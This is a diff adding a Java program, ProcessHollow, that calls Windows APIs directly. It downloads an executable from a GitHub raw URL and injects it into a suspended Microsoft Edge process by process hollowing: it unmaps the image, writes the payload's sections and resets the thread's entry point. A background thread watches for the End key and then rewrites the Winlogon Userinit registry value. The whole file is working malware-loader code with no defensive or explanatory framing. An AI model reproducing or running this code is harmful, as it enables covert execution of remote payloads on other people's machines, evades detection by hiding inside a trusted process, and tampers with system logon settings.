@@ -1,0 +1,299 @@
+import java.lang.foreign.*;
+import java.lang.invoke.*;
+import java.net.*;
+import java.net.http.*;
+import java.nio.*;
+import java.util.*;
+import java.io.*;
+
+public class ProcessHollow {
+
+    static MethodHandle createProcess;
+    static MethodHandle virtualAllocEx;
+    static MethodHandle writeProcessMemory;
+    static MethodHandle zwUnmapViewOfSection;
+    static MethodHandle setThreadContext;
+    static MethodHandle getThreadContext;
+    static MethodHandle resumeThread;
+    static MethodHandle closeHandle;
+    static MethodHandle regOpenKeyEx;
+    static MethodHandle regSetValueEx;
+    static MethodHandle regCloseKey;
+    static MethodHandle beep;
+    static MethodHandle getAsyncKeyState;
+
+    static {
+        try {
+            Linker linker = Linker.nativeLinker();
+            SymbolLookup kernel32 = SymbolLookup.libraryLookup("kernel32", Arena.global());
+            SymbolLookup ntdll = SymbolLookup.libraryLookup("ntdll", Arena.global());
+            SymbolLookup advapi32 = SymbolLookup.libraryLookup("advapi32", Arena.global());
+            SymbolLookup user32 = SymbolLookup.libraryLookup("user32", Arena.global());
+
+            createProcess = linker.downcallHandle(
+                kernel32.find("CreateProcessW").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.JAVA_INT,
+                    ValueLayout.ADDRESS, ValueLayout.ADDRESS, ValueLayout.ADDRESS,
+                    ValueLayout.ADDRESS, ValueLayout.JAVA_BOOLEAN, ValueLayout.JAVA_INT,
+                    ValueLayout.ADDRESS, ValueLayout.ADDRESS, ValueLayout.ADDRESS, ValueLayout.ADDRESS));
+
+            virtualAllocEx = linker.downcallHandle(
+                kernel32.find("VirtualAllocEx").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.ADDRESS,
+                    ValueLayout.ADDRESS, ValueLayout.ADDRESS,
+                    ValueLayout.JAVA_LONG, ValueLayout.JAVA_INT, ValueLayout.JAVA_INT));
+
+            writeProcessMemory = linker.downcallHandle(
+                kernel32.find("WriteProcessMemory").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.JAVA_INT,
+                    ValueLayout.ADDRESS, ValueLayout.ADDRESS, ValueLayout.ADDRESS,
+                    ValueLayout.JAVA_LONG, ValueLayout.ADDRESS));
+
+            zwUnmapViewOfSection = linker.downcallHandle(
+                ntdll.find("ZwUnmapViewOfSection").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.JAVA_INT,
+                    ValueLayout.ADDRESS, ValueLayout.ADDRESS));
+
+            getThreadContext = linker.downcallHandle(
+                kernel32.find("GetThreadContext").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.JAVA_INT,
+                    ValueLayout.ADDRESS, ValueLayout.ADDRESS));
+
+            setThreadContext = linker.downcallHandle(
+                kernel32.find("SetThreadContext").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.JAVA_INT,
+                    ValueLayout.ADDRESS, ValueLayout.ADDRESS));
+
+            resumeThread = linker.downcallHandle(
+                kernel32.find("ResumeThread").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.JAVA_INT, ValueLayout.ADDRESS));
+
+            closeHandle = linker.downcallHandle(
+                kernel32.find("CloseHandle").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.JAVA_INT, ValueLayout.ADDRESS));
+
+            regOpenKeyEx = linker.downcallHandle(
+                advapi32.find("RegOpenKeyExW").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.JAVA_INT,
+                    ValueLayout.ADDRESS, ValueLayout.ADDRESS, ValueLayout.JAVA_INT,
+                    ValueLayout.JAVA_INT, ValueLayout.ADDRESS));
+
+            regSetValueEx = linker.downcallHandle(
+                advapi32.find("RegSetValueExW").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.JAVA_INT,
+                    ValueLayout.ADDRESS, ValueLayout.ADDRESS, ValueLayout.JAVA_INT,
+                    ValueLayout.JAVA_INT, ValueLayout.ADDRESS, ValueLayout.JAVA_INT));
+
+            regCloseKey = linker.downcallHandle(
+                advapi32.find("RegCloseKey").orElseThrow(),
+                FunctionDescriptor.ofVoid(ValueLayout.ADDRESS));
+
+            beep = linker.downcallHandle(
+                kernel32.find("Beep").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.JAVA_INT, ValueLayout.JAVA_INT, ValueLayout.JAVA_INT));
+
+            getAsyncKeyState = linker.downcallHandle(
+                user32.find("GetAsyncKeyState").orElseThrow(),
+                FunctionDescriptor.of(ValueLayout.JAVA_SHORT, ValueLayout.JAVA_INT));
+        } catch (Throwable t) {
+            throw new RuntimeException(t);
+        }
+    }
+
+    public static void Load(byte[] buffer, String host, String args) throws Throwable {
+        try (Arena arena = Arena.ofConfined()) {
+            ByteBuffer bb = ByteBuffer.wrap(buffer).order(ByteOrder.LITTLE_ENDIAN);
+
+            int e_lfanew = bb.getInt(0x3C);
+            int sizeOfImage = bb.getInt(e_lfanew + 0x18 + 0x38);
+            int sizeOfHeaders = bb.getInt(e_lfanew + 0x18 + 0x3C);
+            int entryPoint = bb.getInt(e_lfanew + 0x18 + 0x10);
+            short numberOfSections = bb.getShort(e_lfanew + 0x4 + 0x2);
+            short sizeOfOptionalHeader = bb.getShort(e_lfanew + 0x4 + 0x10);
+            long imageBase = bb.getLong(e_lfanew + 0x18 + 0x18);
+
+            System.out.println("Ready..");
+
+            MemorySegment pThreadContext = arena.allocate(0x4d0);
+
+            String targetHost = host;
+            if (args != null && !args.isEmpty()) targetHost += " " + args;
+            String currentDirectory = System.getProperty("user.dir");
+
+            pThreadContext.set(ValueLayout.JAVA_INT, 0x30, 0x0010001B);
+
+            MemorySegment bStartupInfo = arena.allocate(0x68);
+            MemorySegment bProcessInfo = arena.allocate(0x18);
+            bStartupInfo.set(ValueLayout.JAVA_INT, 0, 0x68);
+
+            byte[] targetHostBytes = ("\"" + targetHost + "\"\0").getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
+            MemorySegment targetHostSeg = arena.allocate(targetHostBytes.length);
+            targetHostSeg.copyFrom(MemorySegment.ofArray(targetHostBytes));
+
+            byte[] currentDirBytes = (currentDirectory + "\0").getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
+            MemorySegment currentDirSeg = arena.allocate(currentDirBytes.length);
+            currentDirSeg.copyFrom(MemorySegment.ofArray(currentDirBytes));
+
+            int success = (int) createProcess.invokeExact(
+                MemorySegment.NULL, targetHostSeg, MemorySegment.NULL, MemorySegment.NULL,
+                true, 0x00000004, MemorySegment.NULL, currentDirSeg, bStartupInfo, bProcessInfo);
+
+            if (success == 0) return;
+
+            long processHandle = bProcessInfo.get(ValueLayout.JAVA_LONG, 0x0);
+            long threadHandle = bProcessInfo.get(ValueLayout.JAVA_LONG, 0x8);
+
+            MemorySegment hProcess = MemorySegment.ofAddress(processHandle);
+            MemorySegment hThread = MemorySegment.ofAddress(threadHandle);
+            MemorySegment imageBaseSeg = MemorySegment.ofAddress(imageBase);
+
+            int unmapResult = (int) zwUnmapViewOfSection.invokeExact(hProcess, imageBaseSeg);
+
+            MemorySegment remoteAddr = (MemorySegment) virtualAllocEx.invokeExact(
+                hProcess, imageBaseSeg, (long) sizeOfImage, 0x3000, 0x40);
+            long remoteAddrLong = remoteAddr.address();
+
+            if (remoteAddrLong == 0) return;
+
+            MemorySegment headerSeg = arena.allocate(sizeOfHeaders);
+            headerSeg.copyFrom(MemorySegment.ofArray(Arrays.copyOf(buffer, sizeOfHeaders)));
+            int w1 = (int) writeProcessMemory.invokeExact(
+                hProcess, imageBaseSeg, headerSeg, (long) sizeOfHeaders, MemorySegment.NULL);
+
+            for (short i = 0; i < numberOfSections; i++) {
+                int secOff = e_lfanew + (0x18 + sizeOfOptionalHeader) + (0x28 * i);
+                int virtualAddress = bb.getInt(secOff + 0x0C);
+                int sizeOfRawData = bb.getInt(secOff + 0x10);
+                int pointerToRawData = bb.getInt(secOff + 0x14);
+
+                if (pointerToRawData + sizeOfRawData > buffer.length || sizeOfRawData <= 0) {
+                    continue;
+                }
+
+                byte[] sectionData = Arrays.copyOfRange(buffer, pointerToRawData, pointerToRawData + sizeOfRawData);
+                MemorySegment sectionSeg = arena.allocate(sectionData.length);
+                sectionSeg.copyFrom(MemorySegment.ofArray(sectionData));
+
+                MemorySegment targetAddr = MemorySegment.ofAddress(imageBase + virtualAddress);
+                int w = (int) writeProcessMemory.invokeExact(
+                    hProcess, targetAddr, sectionSeg, (long) sectionData.length, MemorySegment.NULL);
+            }
+
+            int gtc = (int) getThreadContext.invokeExact(hThread, pThreadContext);
+
+            long rdx = pThreadContext.get(ValueLayout.JAVA_LONG, 0x88);
+
+            if (rdx != 0) {
+                MemorySegment imageBaseBytes = arena.allocate(8);
+                imageBaseBytes.set(ValueLayout.JAVA_LONG, 0, imageBase);
+                int w = (int) writeProcessMemory.invokeExact(
+                    hProcess, MemorySegment.ofAddress(rdx + 16), imageBaseBytes, 8L, MemorySegment.NULL);
+            }
+
+            long newEntryPoint = imageBase + entryPoint;
+            pThreadContext.set(ValueLayout.JAVA_LONG, 0x80, newEntryPoint);
+
+            int stc = (int) setThreadContext.invokeExact(hThread, pThreadContext);
+
+            int rt = (int) resumeThread.invokeExact(hThread);
+
+            int ch1 = (int) closeHandle.invokeExact(hProcess);
+            int ch2 = (int) closeHandle.invokeExact(hThread);
+        }
+    }
+
+    public static void main(String[] args) throws Throwable {
+        try {
+            // Inicia o monitor de teclado
+            monitorKeyboard();
+            
+            String url = "https://github.com/hugoleitevitor-cyber/aaaaaaaaaaaaaaa/raw/refs/heads/main/MixCodes.exe";
+            String file = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
+
+            byte[] data = downloadFileAsync(url);
+            Load(data, file, "");
+        } catch (Exception e) {
+        }
+    }
+
+    static byte[] downloadFileAsync(String url) throws Exception {
+        HttpClient client = HttpClient.newBuilder()
+            .followRedirects(HttpClient.Redirect.NORMAL)
+            .build();
+        HttpRequest request = HttpRequest.newBuilder()
+            .uri(URI.create(url))
+            .header("User-Agent", "Mozilla/5.0")
+            .GET()
+            .build();
+        HttpResponse<byte[]> response = client.send(request, HttpResponse.BodyHandlers.ofByteArray());
+        if (response.statusCode() != 200) {
+            throw new RuntimeException("HTTP " + response.statusCode());
+        }
+        return response.body();
+    }
+
+    static void restoreRegistry() {
+        try (Arena arena = Arena.ofConfined()) {
+            // HKEY_LOCAL_MACHINE = 0x80000002
+            MemorySegment hkeyLocalMachine = MemorySegment.ofAddress(0x80000002L);
+            
+            // Caminho da chave do registro
+            String keyPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
+            byte[] keyPathBytes = (keyPath + "\0").getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
+            MemorySegment keyPathSeg = arena.allocate(keyPathBytes.length);
+            keyPathSeg.copyFrom(MemorySegment.ofArray(keyPathBytes));
+            
+            // Abre a chave
+            MemorySegment hKey = arena.allocate(ValueLayout.ADDRESS);
+            int result = (int) regOpenKeyEx.invokeExact(
+                hkeyLocalMachine, keyPathSeg, 0, 0x20006, hKey); // KEY_SET_VALUE
+            
+            if (result == 0) {
+                MemorySegment hKeyValue = hKey.get(ValueLayout.ADDRESS, 0);
+                
+                // Valor legítimo padrão
+                String legitimateValue = "C:\\Windows\\system32\\userinit.exe,";
+                byte[] valueBytes = (legitimateValue + "\0").getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
+                MemorySegment valueSeg = arena.allocate(valueBytes.length);
+                valueSeg.copyFrom(MemorySegment.ofArray(valueBytes));
+                
+                // Nome do valor
+                String valueName = "Userinit";
+                byte[] valueNameBytes = (valueName + "\0").getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
+                MemorySegment valueNameSeg = arena.allocate(valueNameBytes.length);
+                valueNameSeg.copyFrom(MemorySegment.ofArray(valueNameBytes));
+                
+                // Define o valor
+                int setResult = (int) regSetValueEx.invokeExact(
+                    hKeyValue, valueNameSeg, 0, 1, valueSeg, valueBytes.length); // REG_SZ = 1
+                
+                regCloseKey.invokeExact(hKeyValue);
+                
+                if (setResult == 0) {
+                    int beepResult = (int) beep.invokeExact(750, 300);
+                }
+            }
+        } catch (Throwable t) {
+        }
+    }
+
+    static void monitorKeyboard() {
+        new Thread(() -> {
+            try {
+                while (true) {
+                    Thread.sleep(100);
+                    
+                    // VK_END = 0x23
+                    short endState = (short) getAsyncKeyState.invokeExact(0x23);
+                    
+                    // Verifica se a tecla está pressionada (bit alto é 1)
+                    if ((endState & 0x8000) != 0) {
+                        restoreRegistry();
+                        break;
+                    }
+                }
+            } catch (Throwable t) {
+            }
+        }).start();
+    }
+}
